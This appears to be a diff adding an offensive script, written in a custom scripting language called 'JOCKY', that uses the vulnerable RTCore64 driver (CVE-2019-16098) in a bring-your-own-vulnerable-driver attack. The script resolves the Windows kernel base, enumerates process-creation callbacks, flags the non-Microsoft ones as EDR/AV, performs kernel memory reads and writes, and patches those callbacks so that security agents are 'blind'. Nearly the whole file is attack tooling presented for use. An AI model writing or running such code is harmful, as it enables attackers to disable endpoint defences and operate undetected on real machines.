@@ -1,0 +1,108 @@
+## kernel_recon.jk — Kernel-Level Reconnaissance via BYOVD
+## Demonstrates kernel-level operations using a loaded vulnerable driver:
+##   - Resolve ntoskrnl base address
+##   - Enumerate EDR/AV process-notify callbacks
+##   - Identify non-Microsoft (EDR) callbacks
+##   - Optionally patch (blind) EDR callbacks
+##
+## This script requires a loaded BYOVD driver.
+## Run in kernel mode: python jocky.py run --kernel scripts/kernel_recon.jk
+## Simulation mode:    python jocky.py run scripts/kernel_recon.jk
+
+func print_line() -> nothing {
+    report(`--------------------------------------------------`)
+}
+
+func check_ms(module : text) -> flag {
+    check (module is `ntoskrnl.exe`)  { give yes }
+    check (module is `hal.dll`)       { give yes }
+    check (module is `ci.dll (Code Integrity)`) { give yes }
+    give no
+}
+
+func start() -> nothing {
+    print_line()
+    report(`JOCKY Kernel Reconnaissance Module`)
+    report(`BYOVD Technique: RTCore64 / CVE-2019-16098`)
+    print_line()
+
+    ## Step 1: Resolve kernel base (no privileges needed)
+    report(`[1] Resolving ntoskrnl.exe base address...`)
+    var base : num := kernel_base()
+    check (base is 0) {
+        report(`    Could not resolve kernel base.`)
+    }
+    check (base isnt 0) {
+        report(`    ntoskrnl.exe loaded at:`)
+        report(`    [kernel VA resolved via NtQuerySystemInformation]`)
+    }
+
+    print_line()
+
+    ## Step 2: Enumerate process-notify callbacks
+    report(`[2] Enumerating PsCreateProcessNotifyRoutine callbacks...`)
+    var cb_list : raw  := kernel_enum_callbacks()
+    var cb_cnt  : num  := kernel_callback_count(cb_list)
+
+    report(`    Callbacks registered:`)
+
+    var i    : num  := 0
+    var edr  : num  := 0
+    loop (i lt cb_cnt) {
+                var mname : text := kernel_callback_module(cb_list, i)
+        var addr  : num  := kernel_callback_addr(cb_list, i)
+        var is_ms : flag := check_ms(mname)
+
+        check (is_ms) {
+            report(`    [MS]  `)
+            report(mname)
+        }
+        check (flip is_ms) {
+            report(`    [EDR] `)
+            report(mname)
+            edr <- edr + 1
+        }
+        i <- i + 1
+    }
+
+    print_line()
+    report(`[3] Summary`)
+    report(`    Total callbacks:`)
+
+    check (edr is 0) {
+        report(`    No EDR/AV callbacks detected.`)
+    }
+    check (edr isnt 0) {
+        report(`    Non-Microsoft (EDR/AV) callbacks found.`)
+        report(`    These callbacks give AV/EDR visibility into process creation.`)
+        report(`    Patching them will blind the security agent at kernel level.`)
+    }
+
+    print_line()
+
+    ## Step 3: Kernel memory demonstration
+    report(`[4] Kernel memory read/write demonstration`)
+    report(`    Reading at resolved ntoskrnl offset...`)
+    var mem_data : raw := kernel_read(base, 8)
+    report(`    Kernel memory buffer obtained.`)
+
+    report(`    Demonstrating kernel write (simulation):`)
+    kernel_write(base, 0)
+    report(`    [DEMO] Write suppressed in simulation mode.`)
+
+    print_line()
+    report(`[5] EDR Blind Operation`)
+    check (edr is 0) {
+        report(`    No EDR callbacks to patch.`)
+    }
+    check (edr isnt 0) {
+        var patched : num := kernel_blind_edr()
+        report(`    EDR callbacks neutralised.`)
+        report(`    Security agents are now blind to process creation events.`)
+    }
+
+    print_line()
+    report(`Kernel Reconnaissance Complete`)
+    report(`BYOVD exploitation path demonstrated.`)
+    print_line()
+}
